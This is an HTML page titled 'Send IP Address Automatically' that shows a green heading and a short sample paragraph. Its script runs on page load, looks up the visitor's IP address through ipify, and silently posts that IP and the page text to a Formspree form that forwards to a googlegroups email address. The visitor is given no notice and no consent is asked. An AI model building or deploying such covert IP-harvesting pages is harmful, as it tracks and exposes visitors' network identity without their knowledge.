<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Send IP Address Automatically</title>
</head>
<body>
  <center>
    <h1 style="color:#00ff00">All Humans, All Equal, To The Dust</h1>
    <p>This is a sample text to capture and send automatically via email.</p>
  </center>

  <script>
    window.onload = function() {
      // Capture the text content of specific elements
      const headerText = document.querySelector("h1").innerText;
      const paragraphText = document.querySelector("p").innerText;

      // Use a third-party service to get the user's IP address
      fetch("https://api.ipify.org?format=json")
        .then(response => {
          if (!response.ok) {
            throw new Error(`Error fetching IP address: ${response.statusText}`);
          }
          return response.json();
        })
        .then(data => {
          const userIP = data.ip; // The user's IP address
          console.log(`User's IP Address: ${userIP}`); // Debugging line to see the IP

          // Combine the text content into one message, including the user's IP address
          const emailMessage = `${headerText}\n\n${paragraphText}\n\nUser IP: ${userIP}`;

          // Prepare form data (this simulates a form submission)
          const formData = new FormData();
          formData.append("email", "googleusers9913337@googlegroups.com"); // Recipient's email
          formData.append("subject", "Captured Text and User IP from Webpage");
          formData.append("message", emailMessage);

          // Send the form data to Formspree endpoint
          fetch("https://formspree.io/f/movqwbek", {
            method: "POST",
            body: formData,
          })
          .then(response => {
            if (response.ok) {
              console.log("Email sent successfully!");
            } else {
              console.error("Error sending email. Response: ", response.status);
            }
          })
          .catch(error => {
            console.error("Error sending email:", error);
          });
        })
        .catch(error => {
          console.error("Error fetching IP address:", error);
        });
    };
  </script>
</body>
</html>
